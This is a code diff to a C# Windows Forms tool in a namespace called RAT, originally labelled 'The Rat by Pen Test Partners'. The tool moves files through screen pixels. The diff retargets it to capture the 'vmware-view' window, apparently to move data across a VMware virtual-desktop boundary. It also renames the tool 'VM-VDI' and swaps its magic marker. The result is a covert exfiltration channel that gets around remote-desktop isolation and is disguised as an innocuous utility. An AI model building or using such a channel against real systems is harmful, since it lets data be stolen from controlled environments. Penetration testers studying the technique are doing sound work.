@@ -1,6 +1,7 @@
 ﻿using System;
 using System.Collections.Generic;
 using System.ComponentModel;
+using System.Diagnostics;
 using System.Drawing;
 using System.Drawing.Imaging;
 using System.IO;
@@ -18,7 +19,7 @@ namespace RAT
 
         private BackgroundWorker worker;
 
-        private const string magicString = "PTP-RAT-CHUNK";
+        private const string magicString = "MITEL";
 
         private byte[] magicHeader;
 
@@ -30,7 +31,7 @@ namespace RAT
 
         private Button buttonSend;
 
-        private readonly int DisplayImageMillis = 1500;
+        private readonly int DisplayImageMillis = 3000;
 
 
         public FormRAT()
@@ -85,12 +86,12 @@ namespace RAT
         private void SendFile(string filename)
         {
             //取得螢幕尺寸
-            Rectangle bounds = Screen.FromControl(this).Bounds;
-            /*
+            //Rectangle bounds = Screen.FromControl(this).Bounds;
+
             Rectangle bounds = new Rectangle();
             bounds.Width = 300;
             bounds.Height = 300;
-            */
+
             List<Bitmap> bitmaps = FileToBitmaps(File.ReadAllBytes(filename), bounds.Width, bounds.Height);
             DisplayBitmaps(bitmaps);
         }
@@ -201,9 +202,32 @@ namespace RAT
 
         private byte[] GetScreenFlash()
         {
+            Bitmap bmp = new Bitmap("D:\\s.png");
+            return Decode(ImageToBytes(bmp));
+            /*
             Bitmap bitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height, BytesToFormat(Screen.PrimaryScreen.BitsPerPixel / 8));
             Graphics.FromImage(bitmap).CopyFromScreen(0, 0, 0, 0, Screen.PrimaryScreen.Bounds.Size, CopyPixelOperation.SourceCopy);
             return Decode(ImageToBytes(bitmap));
+            */
+
+            //Bitmap bitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height, BytesToFormat(Screen.PrimaryScreen.BitsPerPixel / 8));
+            var process = Process.GetProcessesByName("vmware-view").FirstOrDefault();
+
+            ScreenCapture sc = new ScreenCapture();
+            // capture entire screen, and save it to a file
+            IntPtr hWnd = process.MainWindowHandle;
+            string title = "";
+            int index = process.MainWindowTitle.IndexOf(" - ", 0) + 3;
+            if (index <= 3)
+            {
+                title = process.MainWindowTitle;
+            }
+            else
+            {
+                title = process.MainWindowTitle.Substring(index);
+            }
+
+            return Decode(ImageToBytes(sc.CaptureWindow(hWnd)));
         }
 
         public byte[] SubArray(byte[] input, int index, int length)
@@ -235,16 +259,29 @@ namespace RAT
             }
         }
 
-        private static byte[] ImageToBytes(Bitmap bmp)
+        private static byte[] ImageToBytes(Bitmap aaa)
         {
-            Rectangle rect = new Rectangle(0, 0, bmp.Width, bmp.Height);
-            BitmapData bitmapData = bmp.LockBits(rect, ImageLockMode.ReadOnly, bmp.PixelFormat);
-            IntPtr scan = bitmapData.Scan0;
-            int num = Math.Abs(bitmapData.Stride) * bmp.Height;
-            byte[] array = new byte[num];
-            Marshal.Copy(scan, array, 0, num);
-            bmp.UnlockBits(bitmapData);
-            return array;
+
+            aaa.Save("D:\\vmware-view.png", ImageFormat.Png);
+            //Bitmap bmp = new Bitmap("D:\\vmware-view.png");
+
+            using (var stream = new MemoryStream())
+            {
+                aaa.Save(stream, ImageFormat.Png);
+                Bitmap bmp = new Bitmap(stream);
+
+
+
+                Rectangle rect = new Rectangle(0, 0, bmp.Width, bmp.Height);
+                BitmapData bitmapData = bmp.LockBits(rect, ImageLockMode.ReadOnly, bmp.PixelFormat);
+                IntPtr scan = bitmapData.Scan0;
+                int num = Math.Abs(bitmapData.Stride) * bmp.Height;
+                byte[] array = new byte[num];
+                Marshal.Copy(scan, array, 0, num);
+                bmp.UnlockBits(bitmapData);
+                return array;
+            }
+
         }
 
         //抗失真1Bit用1Bytes表示
@@ -353,7 +390,7 @@ namespace RAT
             // 
             this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 12F);
             this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
-            this.ClientSize = new System.Drawing.Size(239, 100);
+            this.ClientSize = new System.Drawing.Size(284, 261);
             this.Controls.Add(this.buttonSend);
             this.Controls.Add(this.groupBoxFunction);
             this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedSingle;
@@ -362,7 +399,7 @@ namespace RAT
             this.Name = "FormRAT";
             this.SizeGripStyle = System.Windows.Forms.SizeGripStyle.Hide;
             this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
-            this.Text = "The Rat by Pen Test Partners";
+            this.Text = "VM-VDI";
             this.groupBoxFunction.ResumeLayout(false);
             this.groupBoxFunction.PerformLayout();
             this.ResumeLayout(false);
